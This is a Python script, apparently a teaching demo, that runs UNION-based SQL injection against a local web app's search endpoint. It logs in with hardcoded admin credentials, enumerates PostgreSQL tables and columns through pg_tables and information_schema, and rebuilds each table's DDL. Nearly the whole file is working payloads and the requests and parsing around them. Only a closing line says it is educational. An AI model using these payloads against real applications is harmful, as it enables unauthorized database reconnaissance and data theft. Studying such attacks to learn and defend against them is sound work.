#!/usr/bin/env python3
"""
SQL Injection Demo Script
Demonstrates how to extract table names and DDL using SQL injection
"""

import requests
import json
import urllib.parse

API_BASE_URL = 'http://localhost:5001/api'

def login_as_admin():
    """Login as admin to get session"""
    response = requests.post(
        f'{API_BASE_URL}/login',
        json={'username': 'admin', 'password': 'admin123'},
        headers={'Content-Type': 'application/json'}
    )
    if response.status_code == 200:
        data = response.json()
        print("✓ Login successful!")
        return True
    else:
        print(f"✗ Login failed: {response.text}")
        return False

def extract_tables():
    """Extract table names using SQL injection"""
    print("\n" + "="*60)
    print("Step 1: Extracting Table Names")
    print("="*60)
    
    # Payload to get table names - using CAST to ensure type compatibility
    payload = "' OR '1'='1' UNION SELECT CAST(tablename AS text), null, null FROM pg_tables WHERE schemaname='public' --"
    
    response = requests.get(
        f'{API_BASE_URL}/search',
        params={
            'username': 'admin',
            'q': payload
        },
        headers={'Content-Type': 'application/json'}
    )
    
    if response.status_code == 200:
        data = response.json()
        if data.get('success') and data.get('results'):
            tables = set()
            for result in data['results']:
                table_name = result.get('computer_name') or result.get('id') or list(result.values())[0] if result else None
                if table_name and table_name not in ['SERVER-01', 'WORKSTATION-05', 'LAPTOP-12']:  # Filter out actual data
                    tables.add(str(table_name))
            
            print(f"\n✓ Found {len(tables)} tables:")
            for table in sorted(tables):
                print(f"  - {table}")
            return sorted(tables)
        else:
            print("✗ No results returned")
            print(f"Response: {json.dumps(data, indent=2)}")
    else:
        print(f"✗ Request failed: {response.status_code}")
        print(f"Response: {response.text}")
    
    return []

def extract_columns(table_name):
    """Extract column information for a specific table"""
    print(f"\n{'='*60}")
    print(f"Step 2: Extracting Columns for Table: {table_name}")
    print("="*60)
    
    # Payload to get column names and types - using CAST for type compatibility
    payload = f"' OR '1'='1' UNION SELECT CAST(column_name AS text), CAST(data_type AS text), null FROM information_schema.columns WHERE table_schema='public' AND table_name='{table_name}' --"
    
    response = requests.get(
        f'{API_BASE_URL}/search',
        params={
            'username': 'admin',
            'q': payload
        },
        headers={'Content-Type': 'application/json'}
    )
    
    if response.status_code == 200:
        data = response.json()
        if data.get('success') and data.get('results'):
            columns = []
            for result in data['results']:
                col_name = result.get('computer_name') or result.get('id') or list(result.values())[0] if result else None
                col_type = result.get('ip_address') or list(result.values())[1] if len(result) > 1 else None
                if col_name:
                    columns.append((str(col_name), str(col_type) if col_type else 'unknown'))
            
            print(f"\n✓ Found {len(columns)} columns:")
            for col_name, col_type in columns:
                print(f"  - {col_name}: {col_type}")
            return columns
        else:
            print("✗ No results returned")
    else:
        print(f"✗ Request failed: {response.status_code}")
        print(f"Response: {response.text}")
    
    return []

def extract_ddl(table_name):
    """Extract DDL (CREATE TABLE statement) using pg_get_tabledef"""
    print(f"\n{'='*60}")
    print(f"Step 3: Extracting DDL for Table: {table_name}")
    print("="*60)
    
    # Try to get DDL using pg_get_tabledef or similar PostgreSQL functions
    # Note: This might not work directly, so we'll construct it from column info
    
    # First get all column details - using CAST for type compatibility
    payload = f"' OR '1'='1' UNION SELECT CAST(column_name AS text), CAST(data_type AS text), CAST(character_maximum_length AS text) FROM information_schema.columns WHERE table_schema='public' AND table_name='{table_name}' ORDER BY ordinal_position --"
    
    response = requests.get(
        f'{API_BASE_URL}/search',
        params={
            'username': 'admin',
            'q': payload
        },
        headers={'Content-Type': 'application/json'}
    )
    
    if response.status_code == 200:
        data = response.json()
        if data.get('success') and data.get('results'):
            columns_info = []
            for result in data['results']:
                col_name = result.get('computer_name') or result.get('id') or list(result.values())[0] if result else None
                col_type = result.get('ip_address') or list(result.values())[1] if len(result) > 1 else None
                col_length = list(result.values())[2] if len(result) > 2 else None
                
                if col_name:
                    columns_info.append({
                        'name': str(col_name),
                        'type': str(col_type) if col_type else 'unknown',
                        'length': str(col_length) if col_length else None
                    })
            
            # Construct DDL
            print(f"\n✓ Reconstructed DDL:")
            print(f"\nCREATE TABLE {table_name} (")
            col_defs = []
            for col in columns_info:
                col_def = f"    {col['name']} {col['type'].upper()}"
                if col['length'] and col['length'] != 'None':
                    col_def += f"({col['length']})"
                col_defs.append(col_def)
            print(",\n".join(col_defs))
            print(");")
            
            return columns_info
    
    return []

def extract_all_schema_info():
    """Extract comprehensive schema information"""
    print(f"\n{'='*60}")
    print("Step 4: Extracting All Schema Information")
    print("="*60)
    
    # Get all tables with their columns in one query - using CAST for type compatibility
    payload = "' OR '1'='1' UNION SELECT CAST(table_name AS text), CAST(column_name AS text), CAST(data_type AS text) FROM information_schema.columns WHERE table_schema='public' ORDER BY table_name, ordinal_position --"
    
    response = requests.get(
        f'{API_BASE_URL}/search',
        params={
            'username': 'admin',
            'q': payload
        },
        headers={'Content-Type': 'application/json'}
    )
    
    if response.status_code == 200:
        data = response.json()
        if data.get('success') and data.get('results'):
            schema = {}
            for result in data['results']:
                table_name = result.get('computer_name') or result.get('id') or list(result.values())[0] if result else None
                col_name = result.get('ip_address') or list(result.values())[1] if len(result) > 1 else None
                col_type = list(result.values())[2] if len(result) > 2 else None
                
                if table_name:
                    if table_name not in schema:
                        schema[table_name] = []
                    if col_name:
                        schema[table_name].append({
                            'column': str(col_name),
                            'type': str(col_type) if col_type else 'unknown'
                        })
            
            print(f"\n✓ Complete Schema Information:")
            for table_name, columns in schema.items():
                print(f"\nTable: {table_name}")
                for col in columns:
                    print(f"  - {col['column']}: {col['type']}")
            
            return schema
    
    return {}

def main():
    print("SQL Injection Demo - Table Schema Extraction")
    print("="*60)
    
    # Login first
    if not login_as_admin():
        print("\nPlease make sure:")
        print("1. The application is running (docker-compose up)")
        print("2. Backend is accessible at http://localhost:5001")
        return
    
    # Extract table names
    tables = extract_tables()
    
    if not tables:
        print("\n⚠ Could not extract tables. Trying alternative method...")
        # Alternative: try pg_tables with proper casting
        payload = "' OR '1'='1' UNION SELECT CAST(tablename AS text), null, null FROM pg_tables WHERE schemaname='public' --"
        response = requests.get(
            f'{API_BASE_URL}/search',
            params={'username': 'admin', 'q': payload}
        )
        if response.status_code == 200:
            data = response.json()
            if data.get('success') and data.get('results'):
                tables = []
                for result in data['results']:
                    table_name = result.get('computer_name') or result.get('id') or list(result.values())[0] if result else None
                    if table_name:
                        tables.append(str(table_name))
                print(f"\n✓ Found {len(tables)} tables using pg_tables:")
                for table in sorted(set(tables)):
                    print(f"  - {table}")
    
    # Extract columns for each table
    if tables:
        for table in tables[:3]:  # Limit to first 3 tables
            columns = extract_columns(table)
            if columns:
                extract_ddl(table)
    
    # Extract all schema info
    extract_all_schema_info()
    
    print("\n" + "="*60)
    print("Demo Complete!")
    print("="*60)
    print("\nNote: These SQL injection techniques are for educational purposes only.")
    print("In production, always use parameterized queries to prevent SQL injection.")

if __name__ == '__main__':
    main()
